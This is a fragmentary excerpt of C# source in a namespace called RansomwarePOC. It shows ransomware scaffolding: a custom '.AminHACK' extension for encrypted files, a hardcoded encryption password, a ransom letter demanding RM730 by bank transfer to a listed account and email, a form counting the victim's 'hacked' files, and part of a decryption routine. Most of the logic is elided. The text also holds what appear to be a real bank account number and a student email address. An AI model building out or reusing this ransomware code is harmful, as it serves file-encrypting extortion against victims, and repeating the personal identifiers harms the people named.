...
namespace RansomwarePOC
{
    ...
    {
        /*
         *  AMIN here, Don't worry these are
        ...
        private const string ENCRYPTED_FILE_EXTENSION = ".AminHACK";
        private const string ENCRYPT_PASSWORD = "Achin201075";
        private const string ACCOUNT_NUMBER = "7636803774 (CIMB)";
        private const string AMOUNT = "730";
        private const string EMAIL_ADDRESS = "Bpj211210393@student.kptm.edu.my";
        ...
        private string RANSOM_LETTER =
           "All of your files have been hacked, HEHE.\n\n" +
           "To fix them, transfer RM" + AMOUNT + " to the following acc: " + ACCOUNT_NUMBER + "\n" +
           "Then Email your transaction here: " + EMAIL_ADDRESS + "\n\n" +
        ...
        private void formatFormPostEncryption()
        {
            ...
            lblCount.Text = "Amin has hacked (count: " + encryptedFileCount + ") of your files :)";
        }
        ...
        private void initializeForm()
        {
            ...
            //this.WindowState = FormWindowState.Maximized;
            lblBitcoinAmount.Text = "Transfer RM" + AMOUNT + " to the following acc:";
            txtBitcoinAddress.Text = ACCOUNT_NUMBER;
        ...
        private static void FileDecrypt(string inputFile, string outputFile, string password)
        {
            ...
            {
                Console.WriteLine("TransferingException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            ...
            {
                Console.WriteLine("Error by closing BankProgress: " + ex.Message);
            }
            finally
            {
